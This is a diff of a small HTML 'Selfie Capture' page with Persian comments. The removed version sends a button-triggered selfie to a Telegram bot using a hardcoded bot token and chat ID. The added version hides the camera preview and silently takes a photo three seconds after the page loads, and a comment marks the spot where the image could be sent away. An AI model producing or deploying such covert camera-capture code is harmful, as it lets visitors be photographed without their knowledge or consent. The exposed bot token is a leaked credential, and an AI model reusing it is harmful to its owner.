@@ -1,65 +1,50 @@
-
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>دوربین سلفی</title>
+  <title>Capture Selfie</title>
   <style>
-    video, canvas {
-      width: 100%;
-      max-width: 400px;
-      border-radius: 10px;
-    }
-    button {
-      padding: 10px 20px;
-      font-size: 18px;
-      margin-top: 10px;
+    /* مخفی کردن ویدئو و تصویر در صفحه */
+    #video, #canvas {
+      display: none;
     }
   </style>
 </head>
 <body>
-  <h2>گرفتن عکس از دوربین سلفی</h2>
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" style="display:none;"></canvas>
-  <button onclick="takePhoto()">گرفتن عکس و ارسال</button>
+  <h1>Selfie Capture</h1>
+
+  <video id="video" width="640" height="480" autoplay></video>
+  <canvas id="canvas" width="640" height="480"></canvas>
 
   <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const BOT_TOKEN = '5799298404:AAH3xl8YK3EmbxZ3_XaRARU5Jt07mMw_9As';
-    const CHAT_ID = '1353504783';
+    const context = canvas.getContext('2d');
 
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-      .then(stream => {
+    // درخواست دسترسی به دوربین
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then((stream) => {
         video.srcObject = stream;
       })
-      .catch(err => {
-        alert('دسترسی به دوربین ممکن نیست: ' + err);
+      .catch((err) => {
+        console.error("Error accessing the camera: ", err);
       });
 
-    function takePhoto() {
-      const context = canvas.getContext('2d');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
+    // گرفتن عکس به صورت خودکار بعد از 3 ثانیه
+    setTimeout(() => {
+      // کشیدن ویدئو به روی کانواس و گرفتن عکس
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, 'selfie.jpg');
 
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-          method: 'POST',
-          body: formData
-        })
-        .then(response => response.json())
-        .then(result => {
-          alert('عکس ارسال شد!');
-        })
-        .catch(error => {
-          alert('خطا در ارسال عکس: ' + error);
-        });
-      }, 'image/jpeg');
-    }
+      // تبدیل عکس به داده Base64
+      const data = canvas.toDataURL('image/png');
+      console.log("Captured image: ", data); // اینجا می‌تونید داده رو ارسال کنید یا ذخیره کنید
+
+      // قطع اتصال دوربین پس از گرفتن عکس
+      const stream = video.srcObject;
+      const tracks = stream.getTracks();
+      tracks.forEach(track => track.stop());
+    }, 3000); // 3 ثانیه بعد از بارگذاری صفحه عکس گرفته می‌شود
   </script>
 </body>
 </html>
